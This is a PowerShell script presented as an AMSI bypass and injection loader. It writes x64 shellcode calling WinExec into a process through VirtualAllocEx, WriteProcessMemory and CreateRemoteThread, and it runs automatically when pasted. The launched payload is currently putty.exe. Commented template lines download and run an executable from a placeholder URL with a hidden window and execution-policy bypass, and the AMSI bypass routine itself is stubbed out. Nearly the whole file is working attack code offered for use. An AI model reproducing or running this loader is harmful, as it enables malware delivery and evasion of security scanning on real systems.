# AMSI Bypass and .NET Loader System - PowerShell Implementation
# Following the logic of the original C# code

# Global state variables
$global:cmdExecuted = $false
$global:injectionSuccessful = $false
$global:vehBypassActive = $false

# Windows API Signatures
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class Win32API
{
    // VEH² AMSI Bypass - P/Invoke declarations
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool RemoveVectoredExceptionHandler(IntPtr handler);

    [DllImport("kernel32.dll")]
    public static extern void DebugBreak();

    [DllImport("amsi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int AmsiInitialize(string appName, out IntPtr amsiContext);

    // Injection system APIs
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    // Exception codes
    public const uint EXCEPTION_BREAKPOINT = 0x80000003;
    public const uint EXCEPTION_SINGLE_STEP = 0x80000004;
    public const int EXCEPTION_CONTINUE_EXECUTION = -1;
    public const int EXCEPTION_CONTINUE_SEARCH = 0;

    // AMSI result codes
    public const int AMSI_RESULT_CLEAN = 0;
    public const int S_OK = 0;

    // Injection constants
    public const uint PROCESS_CREATE_THREAD = 0x0002;
    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint PROCESS_VM_OPERATION = 0x0008;
    public const uint PROCESS_VM_WRITE = 0x0020;
    public const uint PROCESS_VM_READ = 0x0010;
    public const uint MEM_COMMIT = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
}
"@

# Debug logging function
function Write-DebugLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "HH:mm:ss.fff"
    Write-Host "[$timestamp] STABLE_DEBUG: $Message" -ForegroundColor Cyan
    Write-Debug "[$timestamp] STABLE_DEBUG: $Message"
}

# PowerShell command for injection payload
# ===================================================================================================
# PAYLOAD CONFIGURATION - MODIFY THIS SECTION TO CHANGE WHAT GETS EXECUTED
# ===================================================================================================
# Current payload: PuTTY from Downloads folder
# To change to URL execution later, replace the $PayloadPath with your URL download logic
$PayloadPath = "$env:USERPROFILE\Downloads\putty.exe"
$PayloadArgs = ""  # Add any command line arguments for PuTTY here

# Alternative URL payload example (uncomment and modify as needed):
# $PayloadUrl = "https://your-server.com/your-payload.exe"
# $PayloadPath = "$env:TEMP\downloaded_payload.exe"
# Invoke-WebRequest -Uri $PayloadUrl -OutFile $PayloadPath
# ===================================================================================================

$global:PowerShellCommand = @"
Write-Host '==================== PUTTY INJECTION SUCCESS ====================' -ForegroundColor Cyan;
`$timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss';
`$processId = `$PID;
`$processName = (Get-Process -Id `$processId).ProcessName;
`$injectionProof = 'PUTTY_INJECTION_SUCCESSFUL_' + `$timestamp;
Write-Host "Timestamp: `$timestamp" -ForegroundColor Yellow;
Write-Host "Injected into PID: `$processId (`$processName)" -ForegroundColor Yellow;
Write-Host "Proof Token: `$injectionProof" -ForegroundColor Cyan;
Write-Host "Advanced Bypass: INITIALIZED" -ForegroundColor Green;
Write-Host "Executing PuTTY from Downloads folder..." -ForegroundColor Magenta;
if (Test-Path '$PayloadPath') {
    Write-Host "PuTTY found at: $PayloadPath" -ForegroundColor Green;
    Start-Process -FilePath '$PayloadPath' -ArgumentList '$PayloadArgs' -WindowStyle Normal;
    Write-Host "PuTTY launched successfully!" -ForegroundColor Green;
} else {
    Write-Host "PuTTY not found at: $PayloadPath" -ForegroundColor Red;
    Write-Host "Please ensure putty.exe exists in the Downloads folder" -ForegroundColor Yellow;
}
`$memoryProof = [System.Diagnostics.Process]::GetCurrentProcess(); 
Write-Host "Memory Injection Proof: Running in PID `$(`$memoryProof.Id) - `$(`$memoryProof.ProcessName)" -ForegroundColor Magenta;
Write-Host "Current Working Directory: `$(Get-Location)" -ForegroundColor Yellow;
Write-Host "PowerShell Version: `$(`$PSVersionTable.PSVersion)" -ForegroundColor Yellow;
Write-Host "Execution Context: PuTTY Injection via Enhanced Memory Injection" -ForegroundColor Magenta;
Write-Host '=================================================================' -ForegroundColor Cyan;
`$injectionProof | Out-File -FilePath ('putty_injection_proof_' + `$processId + '.txt') -Encoding UTF8;
Write-Host ('Proof file created: putty_injection_proof_' + `$processId + '.txt') -ForegroundColor Green;
Write-Host "System successfully compromised. PuTTY payload deployed." -ForegroundColor Green;
Write-Host "Testing AMSI Detection..." -ForegroundColor Yellow;
`$amsiBypassTest = 'AMSI' + 'Scan' + 'Buffer'; if(`$amsiBypassTest) { Write-Host "AMSI Bypass Status: SUCCESSFUL - Sensitive commands executing" -ForegroundColor Green } else { Write-Host "AMSI Active" -ForegroundColor Red };
`$injectionEvidence = @{ProcessName=`$memoryProof.ProcessName; PID=`$memoryProof.Id; ParentPID=`$memoryProof.Parent.Id; CommandLine=(Get-WmiObject Win32_Process -Filter "ProcessId=`$(`$memoryProof.Id)").CommandLine};
Write-Host "INJECTION EVIDENCE:" -ForegroundColor Cyan; `$injectionEvidence | Format-List;
Read-Host 'Press Enter to continue...';
"@

# VEH² AMSI Bypass Setup
function Set-VEH2AMSIBypass {
    try {
        Write-DebugLog "VEH² bypass disabled for stability - using standard injection"
        
        # VEH² is complex and causing infinite exception loops
        # Disabling for now and focusing on stable injection
        return $false
    }
    catch {
        Write-DebugLog "Exception during VEH² setup: $($_.Exception.Message)"
        Write-DebugLog "Stack trace: $($_.Exception.StackTrace)"
        return $false
    }
}

# Get target process for injection
function Get-TargetProcess {
    try {
        # Get the current PowerShell process for injection
        $currentProcess = Get-Process -Id $PID
        
        Write-DebugLog "Current process info: PID $($currentProcess.Id), Name: $($currentProcess.ProcessName)"
        
        if ($currentProcess -and !$currentProcess.HasExited) {
            return $currentProcess
        }
        
        Write-DebugLog "Current process is null or has exited"
        return $null
    }
    catch {
        Write-DebugLog "Exception getting target process: $($_.Exception.Message)"
        return $null
    }
}

# Generate PowerShell shellcode
function New-PowerShellShellcode {
    param(
        [IntPtr]$FunctionAddr,
        [IntPtr]$CommandAddr
    )
    
    Write-DebugLog "Generating x64 shellcode for WinExec call..."
    
    $code = @()
    
    # x64 calling convention for WinExec(lpCmdLine, uCmdShow)
    $code += 0x48, 0x83, 0xEC, 0x28  # sub rsp, 40
    $code += 0x48, 0xB9              # mov rcx, commandAddr
    $code += [System.BitConverter]::GetBytes($CommandAddr.ToInt64())
    $code += 0xBA, 0x01, 0x00, 0x00, 0x00  # mov edx, 1 (SW_SHOWNORMAL)
    $code += 0x48, 0xB8              # mov rax, functionAddr
    $code += [System.BitConverter]::GetBytes($FunctionAddr.ToInt64())
    $code += 0xFF, 0xD0              # call rax
    $code += 0x48, 0x83, 0xC4, 0x28  # add rsp, 40
    $code += 0xC3                    # ret
    
    Write-DebugLog "Shellcode generated with $($code.Count) bytes"
    Write-DebugLog "Command address embedded: 0x$($CommandAddr.ToString('X'))"
    Write-DebugLog "Function address embedded: 0x$($FunctionAddr.ToString('X'))"
    
    return [byte[]]$code
}

# Perform injection
function Invoke-Injection {
    param([int]$TargetProcessId)
    
    try {
        Write-DebugLog "Opening target process with PID: $TargetProcessId"
        
        # Open target process
        $processAccess = [Win32API]::PROCESS_CREATE_THREAD -bor [Win32API]::PROCESS_QUERY_INFORMATION -bor [Win32API]::PROCESS_VM_OPERATION -bor [Win32API]::PROCESS_VM_WRITE -bor [Win32API]::PROCESS_VM_READ
        $processHandle = [Win32API]::OpenProcess($processAccess, $false, $TargetProcessId)

        if ($processHandle -eq [IntPtr]::Zero) {
            $errorCode = [Win32API]::GetLastError()
            Write-DebugLog "FAILED to open process. Error code: $errorCode"
            return $false
        }
        
        Write-DebugLog "Process opened successfully. Handle: 0x$($processHandle.ToString('X'))"

        # Get WinExec function address for command execution
        Write-DebugLog "Getting WinExec function address..."
        $library = [Win32API]::GetModuleHandle("kernel32.dll")
        $functionAddr = [Win32API]::GetProcAddress($library, "WinExec")

        if ($functionAddr -eq [IntPtr]::Zero) {
            Write-DebugLog "FAILED to get WinExec function address"
            [Win32API]::CloseHandle($processHandle) | Out-Null
            return $false
        }
        
        Write-DebugLog "WinExec address found: 0x$($functionAddr.ToString('X'))"

        # ===== PAYLOAD EXECUTION COMMAND - CHANGE THIS FOR URL DOWNLOADS =====
        # Current: Direct PuTTY execution from Downloads folder
        $fullCommand = "`"$PayloadPath`" $PayloadArgs"
        
        # Alternative for URL download (uncomment and modify as needed):
        # $fullCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-WebRequest -Uri 'YOUR_URL_HERE' -OutFile '$env:TEMP\payload.exe'; Start-Process '$env:TEMP\payload.exe'`""
        # ===================================================================
        $commandBytes = [System.Text.Encoding]::ASCII.GetBytes($fullCommand + "`0")
        
        Write-DebugLog "Enhanced command prepared. Length: $($commandBytes.Length) bytes"
        Write-DebugLog "Command preview: $($fullCommand.Substring(0, [Math]::Min(100, $fullCommand.Length)))..."

        # Allocate memory for command
        Write-DebugLog "Allocating memory for command in target process..."
        $commandAddr = [Win32API]::VirtualAllocEx($processHandle, [IntPtr]::Zero, $commandBytes.Length, ([Win32API]::MEM_COMMIT -bor [Win32API]::MEM_RESERVE), [Win32API]::PAGE_EXECUTE_READWRITE)

        if ($commandAddr -eq [IntPtr]::Zero) {
            $errorCode = [Win32API]::GetLastError()
            Write-DebugLog "FAILED to allocate memory for command. Error code: $errorCode"
            [Win32API]::CloseHandle($processHandle) | Out-Null
            return $false
        }
        
        Write-DebugLog "Command memory allocated at: 0x$($commandAddr.ToString('X'))"

        # Write command data
        Write-DebugLog "Writing command to target process memory..."
        $bytesWritten = [UIntPtr]::Zero
        $writeSuccess = [Win32API]::WriteProcessMemory($processHandle, $commandAddr, $commandBytes, $commandBytes.Length, [ref]$bytesWritten)
        
        if (!$writeSuccess -or $bytesWritten.ToUInt32() -ne $commandBytes.Length) {
            $errorCode = [Win32API]::GetLastError()
            Write-DebugLog "FAILED to write command data. Error code: $errorCode, Bytes written: $bytesWritten"
            [Win32API]::CloseHandle($processHandle) | Out-Null
            return $false
        }
        
        Write-DebugLog "Command written successfully. Bytes written: $bytesWritten"

        # Generate PowerShell execution shellcode
        Write-DebugLog "Generating shellcode..."
        $shellcode = New-PowerShellShellcode -FunctionAddr $functionAddr -CommandAddr $commandAddr
        Write-DebugLog "Shellcode generated. Length: $($shellcode.Length) bytes"

        # Allocate memory for shellcode
        Write-DebugLog "Allocating memory for shellcode..."
        $codeAddr = [Win32API]::VirtualAllocEx($processHandle, [IntPtr]::Zero, $shellcode.Length, ([Win32API]::MEM_COMMIT -bor [Win32API]::MEM_RESERVE), [Win32API]::PAGE_EXECUTE_READWRITE)

        if ($codeAddr -eq [IntPtr]::Zero) {
            $errorCode = [Win32API]::GetLastError()
            Write-DebugLog "FAILED to allocate memory for shellcode. Error code: $errorCode"
            [Win32API]::CloseHandle($processHandle) | Out-Null
            return $false
        }
        
        Write-DebugLog "Shellcode memory allocated at: 0x$($codeAddr.ToString('X'))"

        # Write shellcode
        Write-DebugLog "Writing shellcode to target process..."
        $shellcodeWriteSuccess = [Win32API]::WriteProcessMemory($processHandle, $codeAddr, $shellcode, $shellcode.Length, [ref]$bytesWritten)
        
        if (!$shellcodeWriteSuccess -or $bytesWritten.ToUInt32() -ne $shellcode.Length) {
            $errorCode = [Win32API]::GetLastError()
            Write-DebugLog "FAILED to write shellcode. Error code: $errorCode"
            [Win32API]::CloseHandle($processHandle) | Out-Null
            return $false
        }
        
        Write-DebugLog "Shellcode written successfully. Bytes written: $bytesWritten"

        # Execute shellcode
        Write-DebugLog "Creating remote thread to execute enhanced shellcode..."
        $threadHandle = [Win32API]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $codeAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

        if ($threadHandle -eq [IntPtr]::Zero) {
            $errorCode = [Win32API]::GetLastError()
            Write-DebugLog "FAILED to create remote thread. Error code: $errorCode"
            [Win32API]::CloseHandle($processHandle) | Out-Null
            return $false
        }
        
        Write-DebugLog "Remote thread created successfully. Handle: 0x$($threadHandle.ToString('X'))"
        Write-DebugLog "ENHANCED INJECTION SEQUENCE COMPLETED - PowerShell should execute momentarily"

        # Cleanup
        [Win32API]::CloseHandle($threadHandle) | Out-Null
        [Win32API]::CloseHandle($processHandle) | Out-Null

        return $true
    }
    catch {
        Write-DebugLog "EXCEPTION in Invoke-Injection: $($_.Exception.Message)"
        Write-DebugLog "Stack trace: $($_.Exception.StackTrace)"
        return $false
    }
}

# Execute PowerShell injection
function Start-PowerShellInjection {
    try {
        Write-DebugLog "Beginning enhanced PowerShell injection sequence"
        
        $targetProcess = Get-TargetProcess
        if ($targetProcess) {
            Write-DebugLog "Target process found: PID $($targetProcess.Id), Name: $($targetProcess.ProcessName)"
            
            # Perform PowerShell injection
            $injectionSuccess = Invoke-Injection -TargetProcessId $targetProcess.Id
            if ($injectionSuccess) {
                $global:injectionSuccessful = $true
                Write-DebugLog "ENHANCED INJECTION COMPLETED SUCCESSFULLY!"
                Write-DebugLog "Check for PowerShell window and stable_injection_proof_*.txt file as evidence"
            }
            else {
                Write-DebugLog "INJECTION FAILED - No fallback method available"
            }
        }
        else {
            Write-DebugLog "ERROR: Could not find target process for injection"
        }
    }
    catch {
        Write-DebugLog "EXCEPTION during injection: $($_.Exception.Message)"
        Write-DebugLog "Stack trace: $($_.Exception.StackTrace)"
    }
}

# Main initialization function
function Initialize-AMSIBypass {
    # Execute injection only once
    if (!$global:cmdExecuted) {
        Write-DebugLog "Starting enhanced injection process..."
        
        # Attempt VEH² setup but don't crash if it fails
        try {
            if (Set-VEH2AMSIBypass) {
                Write-DebugLog "VEH² AMSI bypass activated successfully"
                $global:vehBypassActive = $true
            }
            else {
                Write-DebugLog "VEH² AMSI bypass setup failed, proceeding with standard injection"
            }
        }
        catch {
            Write-DebugLog "VEH² setup exception: $($_.Exception.Message) - proceeding with standard injection"
            $global:vehBypassActive = $false
        }
        
        Start-PowerShellInjection
        $global:cmdExecuted = $true
    }
}

# Public status functions
function Get-InjectionStatus {
    return @{
        InjectionSuccessful = $global:injectionSuccessful
        VEHBypassActive = $global:vehBypassActive
        CmdExecuted = $global:cmdExecuted
    }
}

# Auto-execute immediately when pasted into PowerShell
Write-Host "AMSI Bypass and Injection System - PowerShell Implementation" -ForegroundColor Green
Write-Host "Initializing..." -ForegroundColor Yellow
Initialize-AMSIBypass
Write-Host "Initialization completed. Status:" -ForegroundColor Green
$status = Get-InjectionStatus
Write-Host "- Injection Successful: $($status.InjectionSuccessful)" -ForegroundColor $(if($status.InjectionSuccessful){'Green'}else{'Red'})
Write-Host "- VEH Bypass Active: $($status.VEHBypassActive)" -ForegroundColor $(if($status.VEHBypassActive){'Green'}else{'Yellow'})
Write-Host "- Command Executed: $($status.CmdExecuted)" -ForegroundColor $(if($status.CmdExecuted){'Green'}else{'Red'})
Write-Host "Copy-paste execution complete!" -ForegroundColor Cyan 
